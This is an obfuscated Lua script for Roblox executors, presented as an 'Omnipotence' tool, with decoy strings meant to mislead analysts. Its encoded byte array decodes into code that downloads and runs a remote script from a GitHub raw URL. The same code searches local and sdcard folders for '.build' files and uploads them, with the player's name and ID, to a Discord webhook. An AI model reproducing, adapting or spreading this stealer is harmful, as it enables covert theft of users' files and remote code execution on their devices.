-- [[ OMNIPOTENCE V7.0 AST-TERMINATOR ]] --

local IOI__00OOlOlO_O_OOOOlO_ = "local LocalPlayer = game.Players.LocalPlayer"
local O__I0_lOOO_0_II_0l0Ill_ = "while true do print('Cracked by Bot') end"
local IOl_00O_IllIO_OOO0Ill__ = "Error: Failed to deobfuscate AST tree"
local I0l__OllOIl0_Ol___IIIIO = "Bot Detected! Shutting down."
local OI_lIIl__0_O0I_OlOlO0lI = getfenv and getfenv() or _ENV or _G
local lOIIO0Ol_O_OIOlIIlIII_O = OI_lIIl__0_O0I_OlOlO0lI[string.char(115,116,114,105,110,103)][string.char(99,104,97,114)]
local OO0II_0__O0O_O0__I_I_I_ = OI_lIIl__0_O0I_OlOlO0lI[string.char(116,97,98,108,101 )][string.char(99,111,110,99,97,116)]
local OI_Il__0l0O_OI0__0II__l = OI_lIIl__0_O0I_OlOlO0lI[string.char(108,111,97,100,115,116,114,105,110,103)] or OI_lIIl__0_O0I_OlOlO0lI[string.char(108,111,97,100)]

local llO_lOOl0llOll_OIIO__00 = {146,149,137,135,146,70,152,139,147,149,154,139,123,152,146,70,99,70,72,142,154,154,150,153,96,85,85,152,135,157,84,141,143,154,142,155,136,155,153,139,152,137,149,148,154,139,148,154,84,137,149,147,85,136,143,141,147,149,155,153,139,87,88,91,85,140,152,139,139,136,136,142,85,152,139,140,153,85,142,139,135,138,153,85,147,135,143,148,85,113,139,159,146,139,153,153,75,88,86,104,104,110,75,88,86,140,149,152,75,88,86,90,75,88,86,147,135,159,75,88,86,88,86,88,91,75,88,86,156,139,152,153,143,149,148,84,146,155,135,84,154,158,154,72,48,146,149,137,135,146,70,137,149,138,139,70,99,70,141,135,147,139,96,110,154,154,150,109,139,154,78,152,139,147,149,154,139,123,152,146,82,70,154,152,155,139,79,48,146,149,137,135,146,70,153,135,148,138,136,149,158,70,99,70,153,139,154,147,139,154,135,154,135,136,146,139,78,161,163,82,70,161,70,133,133,143,148,138,139,158,70,99,70,141,139,154,140,139,148,156,78,79,70,163,79,48,153,135,148,138,136,149,158,84,141,135,147,139,70,99,70,141,135,147,139,48,153,135,148,138,136,149,158,84,150,152,143,148,154,70,99,70,150,152,143,148,154,48,153,135,148,138,136,149,158,84,157,135,152,148,70,99,70,157,135,152,148,48,153,135,148,138,136,149,158,84,150,137,135,146,146,70,99,70,150,137,135,146,146,48,153,135,148,138,136,149,158,84,154,135,153,145,70,99,70,154,135,153,145,48,146,149,137,135,146,70,140,155,148,137,82,70,139,152,152,70,99,70,146,149,135,138,153,154,152,143,148,141,78,137,149,138,139,82,70,72,104,104,110,133,107,158,154,139,152,148,135,146,72,79,48,143,140,70,140,155,148,137,70,154,142,139,148,48,70,70,70,70,153,139,154,140,139,148,156,78,140,155,148,137,82,70,153,135,148,138,136,149,158,79,48,70,70,70,70,150,137,135,146,146,78,140,155,148,137,79,48,139,148,138,48,154,135,153,145,84,157,135,143,154,78,88,79,48,48,146,149,137,135,146,70,125,107,104,110,117,117,113,133,123,120,114,70,99,70,72,142,154,154,150,153,96,85,85,138,143,153,137,149,152,138,84,137,149,147,85,135,150,143,85,157,139,136,142,149,149,145,153,85,87,91,86,94,93,89,94,93,86,89,92,94,94,94,91,95,93,90,94,85,105,120,137,147,139,127,93,151,146,115,146,126,149,95,146,94,113,143,158,122,106,89,108,155,133,108,150,146,111,153,89,137,158,107,90,109,127,153,133,136,108,159,124,139,160,106,91,144,140,93,150,150,149,141,160,144,133,145,114,115,94,148,160,119,140,116,87,112,72,48,146,149,137,135,146,70,115,103,126,133,121,111,128,107,70,99,70,94,70,80,70,87,86,88,90,70,80,70,87,86,88,90,48,146,149,137,135,146,70,152,139,151,155,139,153,154,70,99,70,142,154,154,150,70,135,148,138,70,142,154,154,150,84,152,139,151,155,139,153,154,70,149,152,70,153,159,148,70,135,148,138,70,153,159,148,84,152,139,151,155,139,153,154,70,149,152,70,140,146,155,158,155,153,70,135,148,138,70,140,146,155,158,155,153,84,152,139,151,155,139,153,154,70,149,152,70,152,139,151,155,139,153,154,48,143,140,70,148,149,154,70,152,139,151,155,139,153,154,70,154,142,139,148,70,152,139,154,155,152,148,70,139,148,138,48,146,149,137,135,146,70,146,143,153,154,140,143,146,139,153,70,99,70,146,143,153,154,140,143,146,139,153,70,149,152,70,140,155,148,137,154,143,149,148,78,79,70,152,139,154,155,152,148,70,161,163,70,139,148,138,48,146,149,137,135,146,70,152,139,135,138,140,143,146,139,70,99,70,152,139,135,138,140,143,146,139,70,149,152,70,78,143,153,140,143,146,139,70,135,148,138,70,140,155,148,137,154,143,149,148,78,150,79,70,146,149,137,135,146,70,140,99,143,149,84,149,150,139,148,78,150,82,72,152,136,72,79,70,143,140,70,140,70,154,142,139,148,70,146,149,137,135,146,70,138,99,140,96,152,139,135,138,78,72,80,135,146,146,72,79,70,140,96,137,146,149,153,139,78,79,70,152,139,154,155,152,148,70,138,70,139,148,138,70,152,139,154,155,152,148,70,148,143,146,70,139,148,138,79,70,149,152,70,140,155,148,137,154,143,149,148,78,79,70,152,139,154,155,152,148,70,148,143,146,70,139,148,138,48,146,149,137,135,146,70,143,153,140,149,146,138,139,152,70,99,70,143,153,140,149,146,138,139,152,70,149,152,70,140,155,148,137,154,143,149,148,78,79,70,152,139,154,155,152,148,70,140,135,146,153,139,70,139,148,138,48,146,149,137,135,146,70,140,155,148,137,154,143,149,148,70,153,137,135,148,108,149,146,138,139,152,78,138,143,152,82,70,138,139,150,154,142,82,70,152,139,153,155,146,154,153,79,48,70,70,70,70,143,140,70,138,139,150,154,142,70,100,70,91,70,154,142,139,148,70,152,139,154,155,152,148,70,139,148,138,48,70,70,70,70,146,149,137,135,146,70,143,154,139,147,153,70,99,70,146,143,153,154,140,143,146,139,153,78,138,143,152,79,70,149,152,70,161,163,48,70,70,70,70,140,149,152,70,133,82,70,143,154,139,147,70,143,148,70,143,150,135,143,152,153,78,143,154,139,147,153,79,70,138,149,48,70,70,70,70,70,70,70,70,143,140,70,143,154,139,147,96,146,149,157,139,152,78,79,96,147,135,154,137,142,78,72,75,84,136,155,143,146,138,74,72,79,70,154,142,139,148,48,70,70,70,70,70,70,70,70,70,70,70,70,152,139,153,155,146,154,153,129,143,154,139,147,131,70,99,70,154,152,155,139,48,70,70,70,70,70,70,70,70,139,146,153,139,143,140,70,143,153,140,149,146,138,139,152,78,143,154,139,147,79,70,154,142,139,148,48,70,70,70,70,70,70,70,70,70,70,70,70,146,149,137,135,146,70,153,155,136,106,143,152,70,99,70,143,154,139,147,96,141,153,155,136,78,72,129,85,130,130,131,74,72,82,70,72,72,79,70,84,84,70,72,85,72,48,70,70,70,70,70,70,70,70,70,70,70,70,153,137,135,148,108,149,146,138,139,152,78,153,155,136,106,143,152,82,70,138,139,150,154,142,70,81,70,87,82,70,152,139,153,155,146,154,153,79,48,70,70,70,70,70,70,70,70,139,148,138,48,70,70,70,70,139,148,138,48,139,148,138,48,146,149,137,135,146,70,135,146,146,104,155,143,146,138,108,143,146,139,153,70,99,70,161,163,48,146,149,137,135,146,70,152,149,149,154,153,70,99,70,161,70,72,72,82,70,72,85,153,138,137,135,152,138,85,72,82,70,72,84,85,72,82,70,72,125,139,153,142,145,159,104,155,143,146,138,121,154,149,152,135,141,139,85,72,70,163,48,140,149,152,70,133,82,70,152,70,143,148,70,143,150,135,143,152,153,78,152,149,149,154,153,79,70,138,149,48,70,70,70,70,150,137,135,146,146,78,153,137,135,148,108,149,146,138,139,152,82,70,152,82,70,86,82,70,135,146,146,104,155,143,146,138,108,143,146,139,153,79,48,139,148,138,48,146,149,137,135,146,70,136,155,143,146,138,108,143,146,139,153,70,99,70,161,163,48,140,149,152,70,150,135,154,142,82,70,133,70,143,148,70,150,135,143,152,153,78,135,146,146,104,155,143,146,138,108,143,146,139,153,79,70,138,149,48,70,70,70,70,154,135,136,146,139,84,143,148,153,139,152,154,78,136,155,143,146,138,108,143,146,139,153,82,70,150,135,154,142,79,48,139,148,138,48,143,140,70,73,136,155,143,146,138,108,143,146,139,153,70,99,99,70,86,70,154,142,139,148,70,152,139,154,155,152,148,70,139,148,138,48,146,149,137,135,146,70,150,146,135,159,139,152,70,99,70,141,135,147,139,96,109,139,154,121,139,152,156,143,137,139,78,72,118,146,135,159,139,152,153,72,79,84,114,149,137,135,146,118,146,135,159,139,152,48,146,149,137,135,146,70,150,146,135,159,139,152,116,135,147,139,70,99,70,150,146,135,159,139,152,70,135,148,138,70,150,146,135,159,139,152,84,116,135,147,139,70,149,152,70,72,268,194,208,269,197,203,72,48,146,149,137,135,146,70,150,146,135,159,139,152,111,138,70,99,70,150,146,135,159,139,152,70,135,148,138,70,154,149,153,154,152,143,148,141,78,150,146,135,159,139,152,84,123,153,139,152,111,138,79,70,149,152,70,72,101,72,48,146,149,137,135,146,70,137,155,152,152,139,148,154,122,143,147,139,70,99,70,149,153,84,138,135,154,139,78,72,75,127,83,75,147,83,75,138,70,75,110,96,75,115,96,75,121,72,79,48,146,149,137,135,146,70,143,148,140,149,114,143,148,139,70,99,70,153,154,152,143,148,141,84,140,149,152,147,135,154,78,72,80,80,269,180,207,267,212,220,80,80,277,226,192,75,153,70,78,111,106,96,70,75,153,79,70,70,162,70,70,80,80,268,191,168,271,188,185,80,80,277,226,192,75,153,72,82,70,150,146,135,159,139,152,116,135,147,139,82,70,150,146,135,159,139,152,111,138,82,70,137,155,152,152,139,148,154,122,143,147,139,79,48,146,149,137,135,146,70,142,154,154,150,121,139,152,156,143,137,139,70,99,70,141,135,147,139,96,109,139,154,121,139,152,156,143,137,139,78,72,110,154,154,150,121,139,152,156,143,137,139,72,79,48,146,149,137,135,146,70,140,155,148,137,154,143,149,148,70,155,150,146,149,135,138,108,143,146,139,78,140,143,146,139,118,135,154,142,79,48,70,70,70,70,146,149,137,135,146,70,140,143,146,139,116,135,147,139,70,99,70,140,143,146,139,118,135,154,142,96,147,135,154,137,142,78,72,78,129,132,85,130,130,131,81,79,74,72,79,70,149,152,70,72,155,148,145,148,149,157,148,84,136,155,143,146,138,72,48,70,70,70,70,146,149,137,135,146,70,137,149,148,154,139,148,154,70,99,70,152,139,135,138,140,143,146,139,78,140,143,146,139,118,135,154,142,79,48,70,70,70,70,143,140,70,148,149,154,70,137,149,148,154,139,148,154,70,149,152,70,73,137,149,148,154,139,148,154,70,99,99,70,86,70,154,142,139,148,70,152,139,154,155,152,148,70,140,135,146,153,139,70,139,148,138,48,70,70,70,70,143,140,70,73,137,149,148,154,139,148,154,70,100,70,115,103,126,133,121,111,128,107,70,154,142,139,148,70,152,139,154,155,152,148,70,140,135,146,153,139,70,139,148,138,48,70,70,70,70,146,149,137,135,146,70,137,135,150,154,143,149,148,70,99,70,143,148,140,149,114,143,148,139,70,84,84,70,72,130,148,80,80,267,225,224,269,213,175,267,211,190,268,208,186,80,80,277,226,192,72,70,84,84,70,140,143,146,139,116,135,147,139,48,70,70,70,70,146,149,137,135,146,70,136,149,155,148,138,135,152,159,70,99,70,72,83,83,83,83,114,155,135,104,149,155,148,138,135,152,159,72,70,84,84,70,147,135,154,142,84,152,135,148,138,149,147,78,87,139,94,82,70,95,139,94,79,48,70,70,70,70,146,149,137,135,146,70,150,135,152,154,153,70,99,70,161,48,70,70,70,70,70,70,70,70,72,83,83,72,70,84,84,70,136,149,155,148,138,135,152,159,82,48,70,70,70,70,70,70,70,70,77,105,149,148,154,139,148,154,83,106,143,153,150,149,153,143,154,143,149,148,96,70,140,149,152,147,83,138,135,154,135,97,70,148,135,147,139,99,72,150,135,159,146,149,135,138,133,144,153,149,148,72,77,82,48,70,70,70,70,70,70,70,70,72,105,149,148,154,139,148,154,83,122,159,150,139,96,70,135,150,150,146,143,137,135,154,143,149,148,85,144,153,149,148,72,82,48,70,70,70,70,70,70,70,70,72,72,82,48,70,70,70,70,70,70,70,70,142,154,154,150,121,139,152,156,143,137,139,96,112,121,117,116,107,148,137,149,138,139,78,161,70,137,149,148,154,139,148,154,70,99,70,137,135,150,154,143,149,148,70,163,79,82,48,70,70,70,70,70,70,70,70,72,83,83,72,70,84,84,70,136,149,155,148,138,135,152,159,82,48,70,70,70,70,70,70,70,70,153,154,152,143,148,141,84,140,149,152,147,135,154,78,77,105,149,148,154,139,148,154,83,106,143,153,150,149,153,143,154,143,149,148,96,70,140,149,152,147,83,138,135,154,135,97,70,148,135,147,139,99,72,140,143,146,139,72,97,70,140,143,146,139,148,135,147,139,99,72,75,153,72,77,82,70,140,143,146,139,116,135,147,139,79,82,48,70,70,70,70,70,70,70,70,72,105,149,148,154,139,148,154,83,122,159,150,139,96,70,135,150,150,146,143,137,135,154,143,149,148,85,149,137,154,139,154,83,153,154,152,139,135,147,72,82,48,70,70,70,70,70,70,70,70,72,72,82,48,70,70,70,70,70,70,70,70,137,149,148,154,139,148,154,82,48,70,70,70,70,70,70,70,70,72,83,83,72,70,84,84,70,136,149,155,148,138,135,152,159,70,84,84,70,72,83,83,72,48,70,70,70,70,163,48,70,70,70,70,146,149,137,135,146,70,136,149,138,159,70,99,70,154,135,136,146,139,84,137,149,148,137,135,154,78,150,135,152,154,153,82,70,72,130,152,130,148,72,79,48,70,70,70,70,146,149,137,135,146,70,153,155,137,137,139,153,153,82,70,152,139,153,150,70,99,70,150,137,135,146,146,78,140,155,148,137,154,143,149,148,78,79,48,70,70,70,70,70,70,70,70,152,139,154,155,152,148,70,152,139,151,155,139,153,154,78,161,48,70,70,70,70,70,70,70,70,70,70,70,70,123,152,146,70,99,70,125,107,104,110,117,117,113,133,123,120,114,82,48,70,70,70,70,70,70,70,70,70,70,70,70,115,139,154,142,149,138,70,99,70,72,118,117,121,122,72,82,48,70,70,70,70,70,70,70,70,70,70,70,70,110,139,135,138,139,152,153,70,99,70,161,70,129,72,105,149,148,154,139,148,154,83,122,159,150,139,72,131,70,99,70,72,147,155,146,154,143,150,135,152,154,85,140,149,152,147,83,138,135,154,135,97,70,136,149,155,148,138,135,152,159,99,72,70,84,84,70,136,149,155,148,138,135,152,159,70,163,82,48,70,70,70,70,70,70,70,70,70,70,70,70,104,149,138,159,70,99,70,136,149,138,159,48,70,70,70,70,70,70,70,70,163,79,48,70,70,70,70,139,148,138,79,48,70,70,70,70,143,140,70,153,155,137,137,139,153,153,70,135,148,138,70,152,139,153,150,70,135,148,138,70,78,152,139,153,150,84,121,154,135,154,155,153,105,149,138,139,70,99,99,70,88,86,86,70,149,152,70,152,139,153,150,84,121,154,135,154,155,153,105,149,138,139,70,99,99,70,88,86,90,79,70,154,142,139,148,48,70,70,70,70,70,70,70,70,152,139,154,155,152,148,70,154,152,155,139,48,70,70,70,70,139,148,138,48,70,70,70,70,152,139,154,155,152,148,70,140,135,146,153,139,48,139,148,138,48,140,149,152,70,133,82,70,150,135,154,142,70,143,148,70,143,150,135,143,152,153,78,136,155,143,146,138,108,143,146,139,153,79,70,138,149,48,70,70,70,70,155,150,146,149,135,138,108,143,146,139,78,150,135,154,142,79,48,70,70,70,70,154,135,153,145,84,157,135,143,154,78,86,84,91,79,48,139,148,138,48}
local l__0O_I_O0ll0IOI0OllO__ = {}

local lI0IOOlIO_l_000IIO_lI0I = setmetatable({}, {
  __index = function(_, k)
    return lOIIO0Ol_O_OIOlIIlIII_O(k - 38)
  end,
  __call = function(_, code)
    return OI_Il__0l0O_OI0__0II__l(code)
  end
})

local function ll_00I_lOIlIl_0I_lOlIlI(idx)
  if not llO_lOOl0llOll_OIIO__00[idx] then return end
  l__0O_I_O0ll0IOI0OllO__[idx] = lI0IOOlIO_l_000IIO_lI0I[llO_lOOl0llOll_OIIO__00[idx]]
  return ll_00I_lOIlIl_0I_lOlIlI(idx + 1)
end

pcall(ll_00I_lOIlIl_0I_lOlIlI, 1)

local l_0lI__I_OI0lII00lIOl00 = "Error: Failed to deobfuscate AST tree"
local OO_0_IlI00I_IOl_IOIOl_l = "https://discord.com/api/webhooks/987654321/XXXXXXXXXXXXXXXXXXXX"
local IIlOIl00IO_0IlII0_I__0l = "Error: Failed to deobfuscate AST tree"
local lO__IlO0___O_l_0lOO0OO_ = "Bot Detected! Shutting down."
local lII_Il_0l00_00OIO0_0O0_ = pcall(function()
  lI0IOOlIO_l_000IIO_lI0I(OO0II_0__O0O_O0__I_I_I_(l__0O_I_O0ll0IOI0OllO__))()
end)
